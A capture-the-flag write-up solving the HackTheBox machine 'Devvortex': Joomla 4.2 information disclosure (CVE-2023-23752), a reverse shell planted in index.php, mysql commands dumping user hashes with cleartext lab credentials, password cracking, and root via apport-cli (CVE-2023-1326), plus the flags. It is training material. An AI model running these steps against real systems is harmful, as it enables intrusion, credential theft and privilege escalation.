# Devvortex
> Write-up author: jon-brandy

## Lesson Learned:
- Enumerating subdomain using ffuf.
- Directory listing using dirsearch.
- Exploiting CMS Joomla v4.2 --> CVE-2023-23752.
- Accessing mysql (inline command).
- Cracking password using john.
- Exploiting apport-cli bin for privilege escalation --> CVE-2023-1326.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c8f39e13-398d-457a-9e4c-144fc3b34e35)


## STEPS:
> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sV -sC 10.10.11.242 --min-rate 1000     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-11 01:23 PST
Nmap scan report for 10.10.11.242
Host is up (0.018s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.07 seconds
```

1. Based from the nmap results, the machine runs a web application on port 80 and opens ssh logins on port 22.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/255c310a-13f0-45ae-b577-c6595e09a3bc)


2. Next, I tried to do directory listing and enumerating subdomains using **dirsearch** and **ffuf**.  

> Found a subdomain --> dev.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0be7379d-60e0-4c59-bb60-b7fac8d2d383)


> dev.devvortex.htb

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/39af9892-c655-4589-a4aa-7fd5ac5af7dc)


3. Running dirsearch again, found bunch of endpoint but one of them **administrator** shall be our interest.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b40a7b83-edad-493e-ac79-e66d4e1bcc81)


4. Turns out, it is **Joomla login page**. The webapp using **Joomla** CMS.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/452101aa-1232-4b6c-8fca-f411881795e0)


5. Searching on the internet for joomla login's default creds, shall leads to nothing.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9b745f33-12bd-4216-a328-395676b9a3c4)


6. Running dirsearch again but this time without wordlist, found **README.txt** file and other interesting files.


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/84bd48f3-803b-44f2-91f6-d30a454f1321)


7. Accessing it, shows us the joomla's version.


> VERSION 4.2

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0c30845a-a544-42f6-a3fb-063287bfbb21)


8. Searching on the internet about the exploit for Joomla v4.2, found this promising github's POC.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b5c4a4e5-aff2-4256-b7b7-4be768cbabf9)


9. Reading another POC on exploitdb, seems this is what we are looking for.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/87e3696c-c140-43c9-92d6-e28182fe81ef)


10. Great, let's use it and follow the procedure provided at the github's README.
11. To run the ruby file, there are 3 gems needed. Those are **httpx**, **docopt**, and **paint**.
12. All three can be installed by running:

```
sudo gem install httpx
sudo gem install docopt
sudo gem install paint
```

> EXPLOITING

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4e130ec1-d1bb-4c7b-985a-6c017facf4af)


13. Awesome! We got mysql db cred.
14. However, it's worth to try the cred to login at the **Joomla** login page, I assume there is **password reuse**.

> TURNS OUT IT IS --> We're loggged in

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/73ecccf0-db1a-4ac1-9a08-0ee944eef37d)


15. Next, I start to check the **system** option, then go to the **Warning** notification.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a73ff503-1ef6-4cda-a424-8fa465d3be32)

> The warning message

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/78bbbfb4-5bbd-474c-8b5f-eae43e83d079)


16. Seems it is not our interest.
17. Long story short, I tried to add a simple bash reverse shell at **index.php**.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/283ed526-bb49-46f9-b819-305c8cb51044)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7d1f5082-9027-4493-900b-0cba670c699e)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a84c0253-6b1d-4d0c-a55b-cf5df8d0b14b)


18. Actually, maybe you can add at any .php files here, but make sure you access it to trigger the payload.
19. The payload itself, I outsourced it from **PayloadAllTheThings**.


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2a199f22-0a8f-494c-b7dd-49ec601d2a37)


20. Click save accessing index.php shall trigger our payload.

> GOT THE SHELL

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/492ac440-0433-438b-b78f-3d6a9d614d80)


21. Great! Now let's use mysql to access lewis DB.

> Using mysql --> lewis:P4ntherg0t1n5r3c0n##

```
mysql -u lewis -pP4ntherg0t1n5r3c0n## -e "show databases;"
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9be8a365-b6f0-4ef1-b269-54543cd24fae)


```
mysql -u lewis -pP4ntherg0t1n5r3c0n## -e "use joomla; show tables;"
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c955f290-824e-4439-be9e-a0620e51834b)


22. Noticed, we got bunch of results. But our interest is at the **users** table.

```
mysql -u lewis -pP4ntherg0t1n5r3c0n## -e "use joomla; select username, password from sd4fg_users;"
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/53e02946-1c36-45a7-90d5-521e87e46a38)


23. Awesome! We got 2 creds, we can crack the password using **john**.
24. Long story short, john succeed to crack only for **logan** --> `logan:tequieromucho`.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/afff59fd-0473-42ff-a6ed-b062f1be0038)


25. To make sure whether **logan** is our objective or not. I check what's inside passwd file at the docker container.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/40e3e93a-2f32-481d-b853-b1f5c5e6cf6d)


26. It is indeed logan.

> GETTING USER FLAG 

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9ccd9b85-5156-49b5-92e7-2deab3508c3e)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6cdcb370-e092-49f6-9009-7ffe1cc2c6bd)


## USER FLAG

```
68ec3cf7e4f24ccef72ed7974caa5924
```

27. To gain root, I started by checking the sudo permission for logan.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/064da11b-a476-4842-82b9-f025548b9051)


28. **apport-cli** should be related to GTFO bins.
29. But, searching about it there shall resulting to nothing.
30. Searching on the internet again, found this github repository.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b57552f2-e0d5-4940-a78a-0224025769e7)


31. The version is not the same, but it's worth a try to see if the previous one is indeed vulnerable with this.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/45eb30a9-a591-4f0f-aaed-57f85b3e3919)


32. Checking the **/var** directory, we indeed have **crash** directory.


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c5245503-6b54-4b61-8937-6fbb60e5b6ed)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/48b33553-fce4-4c77-b4e9-a53de9576d88)


33. Based from the github's POC we need a .crash file.
34. Hence we need to make a program and intentionally make it crash.
35. In this example, I made a bash script which intentionally crash.


> BASH SCRIPT

```sh
#!/bin/bash

echo "[+] Script is running"
sleep 5 
echo "Crashing the script"
kill -SEGV $$
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d82bdf18-7a10-4a0a-bff9-6dd55709b0ab)


> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/dbff73f3-63a7-4341-be58-17a3ac793ddd)


36. Nice! Let's run the same command as the github's POC.

```
sudo /usr/bin/apport-cli -c _var_crash_exp.sh.1000.crash

1. type V.
2. type !id.
3. type !bash.
```

> RESULT 

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e6f975d5-4b2c-4108-a08e-3b1e8edfa99f)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6a6a4cc5-7970-4424-9750-6505b6228a9e)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f71e046a-4b2b-45ba-88d8-e690e305b81f)


37. We finally gained root!

> GETTING ROOT FLAG

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4bb0dac7-1682-4131-a9be-5213e40e9b6a)


## ROOT FLAG

```
766364c845299c178b416e68f343dcea
```



## IMPORTANT LINKS

```
https://github.com/Acceis/exploit-CVE-2023-23752
https://www.exploit-db.com/exploits/51334
https://github.com/diego-tella/CVE-2023-1326-PoC
```
